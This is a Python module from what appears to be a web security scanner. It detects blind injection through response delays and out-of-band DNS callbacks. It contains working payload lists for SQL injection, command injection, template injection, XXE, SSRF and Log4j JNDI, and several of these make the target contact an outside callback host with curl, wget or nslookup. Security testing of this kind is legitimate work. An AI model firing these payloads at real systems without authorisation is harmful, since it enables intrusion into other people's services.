"""
Fray Blind Injection Detection — time-based blind + OOB DNS callback.

Detects:
  - Time-based blind SQLi (SLEEP, WAITFOR, pg_sleep, BENCHMARK)
  - Time-based blind SSTI (delayed template evaluation)
  - Time-based blind command injection (sleep, ping -c)
  - OOB via DNS callback (interactsh-compatible, Burp Collaborator-compatible)

Usage:
  tester = WAFTester(...)
  blind = BlindDetector(tester, param="id")
  results = blind.detect_all()
"""

import hashlib
import json
import random
import re
import string
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, List, Optional, Tuple


# ── Time-based blind payloads ────────────────────────────────────────────────

# Each entry: (category, subcategory, payload_template, expected_delay_sec)
# {delay} is replaced with the number of seconds to sleep
_TIME_PAYLOADS: List[Tuple[str, str, str, int]] = [
    # SQLi — MySQL
    ("sqli", "mysql_sleep", "' OR SLEEP({delay})-- -", 3),
    ("sqli", "mysql_sleep", "1' AND SLEEP({delay})-- -", 3),
    ("sqli", "mysql_benchmark", "' OR BENCHMARK(5000000,SHA1('fray'))-- -", 3),
    # SQLi — MSSQL
    ("sqli", "mssql_waitfor", "'; WAITFOR DELAY '0:0:{delay}'-- -", 3),
    ("sqli", "mssql_waitfor", "1; WAITFOR DELAY '0:0:{delay}'-- -", 3),
    # SQLi — PostgreSQL
    ("sqli", "pg_sleep", "'; SELECT pg_sleep({delay})-- -", 3),
    ("sqli", "pg_sleep", "1 OR pg_sleep({delay})-- -", 3),
    # SQLi — Oracle
    ("sqli", "oracle_sleep", "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})-- -", 3),
    # SQLi — SQLite
    ("sqli", "sqlite_sleep", "' AND 1=randomblob(300000000)-- -", 2),
    # Command injection
    ("command_injection", "sleep", "; sleep {delay}", 3),
    ("command_injection", "sleep", "| sleep {delay}", 3),
    ("command_injection", "sleep", "`sleep {delay}`", 3),
    ("command_injection", "sleep", "$(sleep {delay})", 3),
    ("command_injection", "ping", "; ping -c {delay} 127.0.0.1", 3),
    # SSTI — Jinja2 / Twig
    ("ssti", "jinja2_sleep", "{{{{ __import__('time').sleep({delay}) }}}}", 3),
    ("ssti", "twig_sleep", "{{{{ {delay}*1000000000|format }}}}", 2),
]

# ── OOB DNS callback payloads ────────────────────────────────────────────────

# {callback} is replaced with the unique DNS subdomain
_OOB_PAYLOADS: List[Tuple[str, str, str]] = [
    # XXE
    ("xxe", "oob_xxe", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}">]><foo>&xxe;</foo>'),
    # SSRF
    ("ssrf", "oob_ssrf", "http://{callback}/ssrf"),
    ("ssrf", "oob_ssrf", "https://{callback}/ssrf"),
    # Command injection
    ("command_injection", "oob_dns", "; nslookup {callback}"),
    ("command_injection", "oob_curl", "; curl http://{callback}"),
    ("command_injection", "oob_wget", "| wget http://{callback} -O /dev/null"),
    # SQLi — DNS exfil
    ("sqli", "oob_dns_mysql", "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{callback}','\\\\a'))-- -"),
    ("sqli", "oob_dns_mssql", "'; EXEC master..xp_dirtree '\\\\{callback}\\a'-- -"),
    # SSTI
    ("ssti", "oob_ssti", "{{{{ __import__('os').popen('nslookup {callback}').read() }}}}"),
    # Log4j
    ("log4j", "oob_jndi", "${{jndi:ldap://{callback}/a}}"),
    ("log4j", "oob_jndi_obf", "${{${{::-j}}ndi:ldap://{callback}/a}}"),
]


@dataclass
class BlindFinding:
    """A confirmed or suspected blind injection finding."""
    category: str
    subcategory: str
    payload: str
    detection_method: str  # "time_based" or "oob_dns"
    param: str = ""
    evidence: str = ""
    baseline_ms: float = 0.0
    actual_ms: float = 0.0
    delay_delta_ms: float = 0.0
    callback_id: str = ""
    callback_hit: bool = False
    confidence: str = "confirmed"  # confirmed, likely, possible
    timestamp: str = ""

    def to_dict(self) -> Dict:
        d = {
            "category": self.category,
            "subcategory": self.subcategory,
            "payload": self.payload,
            "detection_method": self.detection_method,
            "param": self.param,
            "confidence": self.confidence,
            "timestamp": self.timestamp or datetime.now().isoformat(),
        }
        if self.detection_method == "time_based":
            d["baseline_ms"] = round(self.baseline_ms, 1)
            d["actual_ms"] = round(self.actual_ms, 1)
            d["delay_delta_ms"] = round(self.delay_delta_ms, 1)
            d["evidence"] = self.evidence
        elif self.detection_method == "oob_dns":
            d["callback_id"] = self.callback_id
            d["callback_hit"] = self.callback_hit
        return d


# ── Interactsh / OOB callback client ────────────────────────────────────────

class OOBCallbackClient:
    """Lightweight interactsh-compatible OOB callback client.

    Can also use a custom callback server (any DNS logger).
    """

    def __init__(self, server: str = ""):
        """
        Args:
            server: interactsh server URL (e.g. 'oast.fun', 'interact.sh',
                    'burpcollaborator.net') or custom DNS logger domain.
                    Empty = disabled.
        """
        self.server = server.rstrip("/").replace("https://", "").replace("http://", "")
        self.enabled = bool(self.server)
        self._tokens: Dict[str, str] = {}  # token → description

    def generate_subdomain(self, label: str = "") -> str:
        """Generate a unique callback subdomain."""
        if not self.enabled:
            return ""
        token = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        subdomain = f"{token}.{self.server}"
        self._tokens[token] = label or token
        return subdomain

    def check_interactions(self, token: str = "") -> List[Dict]:
        """Poll the interactsh server for callback hits.

        For interactsh servers, uses the /poll endpoint.
        For custom servers, this is a no-op (user checks their DNS logs).
        """
        if not self.enabled:
            return []

        # Try interactsh /poll API
        if any(ish in self.server for ish in ("oast.fun", "interact.sh", "oast.pro", "oast.live")):
            try:
                url = f"https://{self.server}/poll?id={token}&secret=fray"
                req = urllib.request.Request(url, method="GET")
                req.add_header("User-Agent", "Fray-OOB/1.0")
                resp = urllib.request.urlopen(req, timeout=10)
                data = json.loads(resp.read().decode("utf-8", errors="replace"))
                return data.get("data", []) or data.get("interactions", []) or []
            except Exception:
                return []

        return []  # Custom server — user checks DNS logs manually

    def has_token(self, token: str) -> bool:
        return token in self._tokens


class BlindDetector:
    """Blind injection detector — time-based + OOB DNS."""

    def __init__(self, tester, *, param: str = "input",
                 oob_server: str = "",
                 time_threshold_factor: float = 2.5,
                 verbose: bool = True):
        """
        Args:
            tester: WAFTester instance (already configured with target)
            param: URL parameter to inject into
            oob_server: interactsh/DNS callback server (empty = time-only)
            time_threshold_factor: response must be this many times slower
                                   than baseline to confirm time-based blind
            verbose: print progress
        """
        self.tester = tester
        self.param = param
        self.oob = OOBCallbackClient(oob_server)
        self.threshold_factor = time_threshold_factor
        self.verbose = verbose
        self._baseline_ms: Optional[float] = None
        self._findings: List[BlindFinding] = []

    def _measure_baseline(self, n: int = 3) -> float:
        """Measure average baseline response time (benign request)."""
        if self._baseline_ms is not None:
            return self._baseline_ms

        times = []
        for _ in range(n):
            result = self.tester.test_payload("test123", param=self.param)
            ms = result.get("elapsed_ms", 500)
            times.append(ms)
            time.sleep(0.3)

        self._baseline_ms = sum(times) / len(times) if times else 500.0
        if self.verbose:
            print(f"    Baseline response: {self._baseline_ms:.0f}ms (avg of {n})")
        return self._baseline_ms

    def detect_time_based(self, categories: List[str] = None) -> List[BlindFinding]:
        """Run time-based blind injection detection."""
        baseline = self._measure_baseline()
        findings = []

        payloads = _TIME_PAYLOADS
        if categories:
            payloads = [p for p in payloads if p[0] in categories]

        if self.verbose:
            print(f"\n    Testing {len(payloads)} time-based blind payloads...")

        for cat, subcat, tpl, delay_sec in payloads:
            payload = tpl.replace("{delay}", str(delay_sec))
            expected_ms = delay_sec * 1000

            if self.verbose:
                short = payload[:50].replace("\n", "\\n")
                print(f"    [{cat}/{subcat}] ", end="", flush=True)

            result = self.tester.test_payload(payload, param=self.param)
            actual_ms = result.get("elapsed_ms", 0)
            delta = actual_ms - baseline

            # Detection logic:
            # 1. Response must be significantly slower than baseline
            # 2. Response time should be close to the expected delay
            is_delayed = (actual_ms > baseline * self.threshold_factor and
                          delta > expected_ms * 0.6)

            if result.get("blocked"):
                if self.verbose:
                    print(f"BLOCKED ({actual_ms:.0f}ms)")
                continue

            if is_delayed:
                confidence = "confirmed" if delta > expected_ms * 0.8 else "likely"
                finding = BlindFinding(
                    category=cat,
                    subcategory=subcat,
                    payload=payload,
                    detection_method="time_based",
                    param=self.param,
                    evidence=f"Expected ~{expected_ms}ms delay, got {delta:.0f}ms delta",
                    baseline_ms=baseline,
                    actual_ms=actual_ms,
                    delay_delta_ms=delta,
                    confidence=confidence,
                )
                findings.append(finding)
                self._findings.append(finding)
                if self.verbose:
                    color = "\033[32m" if confidence == "confirmed" else "\033[33m"
                    print(f"{color}VULNERABLE ({confidence})\033[0m — {delta:.0f}ms delta")
            else:
                if self.verbose:
                    print(f"not vulnerable ({actual_ms:.0f}ms)")

            self.tester._stealth_delay()

        return findings

    def detect_oob(self, categories: List[str] = None,
                   poll_delay: float = 5.0) -> List[BlindFinding]:
        """Run OOB DNS callback detection."""
        if not self.oob.enabled:
            if self.verbose:
                print(f"\n    OOB detection: skipped (no callback server)")
                print(f"    Use --oob-server oast.fun to enable")
            return []

        findings = []
        payloads = _OOB_PAYLOADS
        if categories:
            payloads = [p for p in payloads if p[0] in categories]

        if self.verbose:
            print(f"\n    Testing {len(payloads)} OOB callback payloads via {self.oob.server}...")

        # Send all payloads, collecting callback tokens
        sent: List[Tuple[str, str, str, str]] = []  # (cat, subcat, payload, token)
        for cat, subcat, tpl in payloads:
            subdomain = self.oob.generate_subdomain(f"{cat}_{subcat}")
            token = subdomain.split(".")[0]
            payload = tpl.replace("{callback}", subdomain)

            if self.verbose:
                short = payload[:50].replace("\n", "\\n")
                print(f"    [{cat}/{subcat}] sending...", end="", flush=True)

            result = self.tester.test_payload(payload, param=self.param)
            if result.get("blocked"):
                if self.verbose:
                    print(f" BLOCKED")
                continue

            sent.append((cat, subcat, payload, token))
            if self.verbose:
                print(f" sent (token={token[:8]}...)")
            self.tester._stealth_delay()

        if not sent:
            if self.verbose:
                print(f"    No payloads got through — all blocked")
            return []

        # Wait for callbacks
        if self.verbose:
            print(f"\n    Waiting {poll_delay:.0f}s for DNS callbacks...", flush=True)
        time.sleep(poll_delay)

        # Poll for interactions
        for cat, subcat, payload, token in sent:
            interactions = self.oob.check_interactions(token)
            if interactions:
                finding = BlindFinding(
                    category=cat,
                    subcategory=subcat,
                    payload=payload,
                    detection_method="oob_dns",
                    param=self.param,
                    callback_id=token,
                    callback_hit=True,
                    confidence="confirmed",
                )
                findings.append(finding)
                self._findings.append(finding)
                if self.verbose:
                    print(f"    \033[32mCALLBACK HIT\033[0m [{cat}/{subcat}] token={token[:8]}...")
            else:
                if self.verbose:
                    print(f"    No callback [{cat}/{subcat}] token={token[:8]}...")

        return findings

    def detect_all(self, categories: List[str] = None) -> List[BlindFinding]:
        """Run all blind detection methods."""
        if self.verbose:
            print(f"\n  \033[1mBlind Injection Detection\033[0m")
            print(f"  Target: {self.tester.target}")
            print(f"  Param:  {self.param}")

        findings = []
        findings.extend(self.detect_time_based(categories))
        findings.extend(self.detect_oob(categories))

        if self.verbose:
            print(f"\n  \033[1mBlind Detection Summary\033[0m")
            print(f"    Findings: {len(findings)}")
            confirmed = sum(1 for f in findings if f.confidence == "confirmed")
            likely = sum(1 for f in findings if f.confidence == "likely")
            if confirmed:
                print(f"    Confirmed: \033[32m{confirmed}\033[0m")
            if likely:
                print(f"    Likely:    \033[33m{likely}\033[0m")

        return findings

    @property
    def findings(self) -> List[BlindFinding]:
        return self._findings
